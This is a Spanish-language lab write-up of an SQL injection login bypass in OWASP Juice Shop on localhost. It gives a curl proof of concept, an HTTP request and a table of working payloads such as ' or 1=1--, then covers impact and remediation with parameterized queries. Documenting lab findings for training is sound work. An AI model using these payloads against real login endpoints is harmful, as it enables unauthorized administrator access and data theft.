<div align="center">

# 💉 SQL Injection — Login Admin
### OWASP Juice Shop · Authentication Bypass

![Status](https://img.shields.io/badge/Status-Verificado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Severity](https://img.shields.io/badge/Severidad-Crítica-d32f2f?style=for-the-badge)
![Type](https://img.shields.io/badge/Tipo-SQL%20Injection-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)

</div>

---

> **Hallazgo:** el parámetro `email` del endpoint de login no sanitiza el input antes de construir la query SQL, permitiendo bypass completo de autenticación e ingreso como administrador sin credenciales válidas.

> [!WARNING]
> Uso exclusivo en laboratorio controlado (`http://localhost:3000`). No reproducir en sistemas sin autorización explícita.

---

## 📋 Resumen del Hallazgo

| Campo | Detalle |
|-------|---------|
| **Aplicación** | OWASP Juice Shop |
| **Endpoint** | `POST /rest/user/login` |
| **Parámetro** | `email` (body JSON) |
| **Tipo** | SQL Injection — Authentication Bypass |
| **Severidad** | 🔴 Crítica |
| **CVSS v3** | 9.8 · AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Autenticación** | No requerida |
| **Estado** | ✅ Verificado |

---

## 🔍 Descripción

El endpoint `/rest/user/login` recibe `email` y `password` en JSON. El valor de `email` se concatena directamente en una query SQL sin usar prepared statements ni sanitización. Al inyectar `' or 1=1--` la condición `WHERE email = '...'` se reemplaza por una condición siempre verdadera, retornando el primer usuario de la tabla — que es el administrador.

> [!NOTE]
> Juice Shop usa SQLite en su backend. El comentario `--` anula el resto de la query incluyendo la validación del password.

---

## 🔬 Análisis Técnico

### `[01]` Query original (inferida)

```sql
SELECT * FROM Users WHERE email = 'INPUT' AND password = 'HASH'
```

### `[02]` Query con payload inyectado

```sql
SELECT * FROM Users WHERE email = '' or 1=1--' AND password = '...'
--                                   ^^^^^^^^ siempre true
--                                                             ^^ comentado
```

Resultado: retorna la primera fila de `Users` — `admin@juice-sh.op`.

---

## 🧪 Reproducción

### `[01]` Request vulnerable

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"' or 1=1--","password":"x"}
```

### `[02]` PoC — curl

```bash
curl -s -X POST http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' or 1=1--","password":"x"}'
```

### `[03]` Resultado observado

```json
{
  "authentication": {
    "token": "<JWT>",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

- Status: `200 OK`
- Token JWT de sesión admin obtenido
- Challenge `Login Admin` → `solved: true`

---

## 🔁 Payloads Verificados

| Payload | Resultado |
|---------|-----------|
| `' or 1=1--` | ✅ Login exitoso como admin |
| `admin@juice-sh.op'--` | ✅ Login directo a admin |
| `admin@juice-sh.op' or 1=1--` | ✅ Login exitoso |
| `' OR 1=1--` | ✅ Login exitoso |
| `' or 1=1/*` | ✅ Login exitoso |
| `' or 1=1#` | ❌ Error — `#` no funciona en SQLite |

---

## ✅ Validación del Challenge

```bash
python3 - <<'PY'
import json, urllib.request
ch = json.load(urllib.request.urlopen('http://localhost:3000/api/Challenges/'))['data']
print([c for c in ch if c['name'] == 'Login Admin'][0]['solved'])
PY
```

Salida esperada: `True`

---

## 🔁 Flujo con Caido

1. Capturar `POST /rest/user/login` en `HTTP History`
2. `Send to Replay`
3. Sustituir `email` por `' or 1=1--`
4. Verificar respuesta `200` y token JWT en body

---

## 💥 Impacto

- **Autenticación rota**: acceso total como administrador sin credenciales
- **Confidencialidad**: acceso a datos de todos los usuarios
- **Integridad**: posibilidad de modificar, eliminar y crear datos
- **Disponibilidad**: acceso a funciones destructivas de admin
- **Pivot**: token admin habilita ataques de escalamiento (SSRF, uploads, BAC)

> [!IMPORTANT]
> Con el token JWT de admin obtenido es posible escalar a otros hallazgos que requieren autenticación: SSRF, File Upload, cambios de perfil.

---

## 🔧 Remediación

| Medida | Descripción |
|--------|-------------|
| **Prepared statements** | Usar queries parametrizadas — nunca concatenar input en SQL |
| **ORM** | Usar Sequelize/TypeORM con binding de parámetros |
| **Input validation** | Validar formato de email antes de llegar a la query |
| **Rate limiting** | Limitar intentos de login por IP/usuario |
| **Logging** | Registrar y alertar sobre intentos con caracteres SQL especiales |

```javascript
// ❌ Vulnerable
db.query(`SELECT * FROM Users WHERE email='${email}'`);

// ✅ Seguro
db.query('SELECT * FROM Users WHERE email = ?', [email]);
```

---

## 🔗 Referencias

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
